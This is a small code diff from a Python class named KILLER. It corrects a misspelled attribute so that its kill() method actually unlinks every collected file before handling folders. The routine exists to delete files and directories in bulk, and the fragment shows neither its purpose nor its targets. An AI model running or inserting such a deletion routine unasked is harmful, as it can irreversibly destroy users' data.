@@ -41,7 +41,7 @@ class KILLER():
 		self.Files, self.Folders = sorted(self.Files, key=lel)[::-1], sorted(self.Folders, key=lel)[::-1]
 
 	def kill(self):
-		for i in self.Fiels:
+		for i in self.Files:
 			os.unlink(i)
 
 		for i in self.Folders:
